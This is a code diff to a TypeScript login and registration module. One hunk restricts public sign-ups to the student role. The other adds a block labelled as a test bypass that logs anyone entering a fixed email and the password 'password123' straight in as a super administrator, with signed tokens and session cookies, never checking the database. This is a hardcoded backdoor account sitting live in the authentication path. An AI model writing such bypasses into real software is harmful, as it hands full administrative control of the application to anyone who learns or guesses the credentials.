@@ -33,7 +33,9 @@ export async function registerAction(prevState: AuthState, formData: FormData): 
         return { error: (parsed.error as any).errors[0].message };
     }
 
-    const { name, email, password, role } = parsed.data;
+    // Force Role to STUDENT for public registration
+    const { name, email, password } = parsed.data;
+    const role = Role.STUDENT;
 
     try {
         await connectToDatabase();
@@ -84,6 +86,16 @@ export async function loginAction(prevState: AuthState, formData: FormData): Pro
 
     const { email, password } = parsed.data;
     let redirectPath = '/student';
+
+    // --- HARDCODED TEST BYPASS ---
+    if (email === 'super@etamax.com' && password === 'password123') {
+        const payload = { userId: 'hardcoded-super-admin', role: Role.SUPER_ADMIN };
+        const accessToken = await signToken(payload);
+        const refreshToken = await signRefreshToken(payload);
+        await setSessionCookie(accessToken, refreshToken);
+        redirect('/admin');
+    }
+    // -----------------------------
 
     try {
         await connectToDatabase();
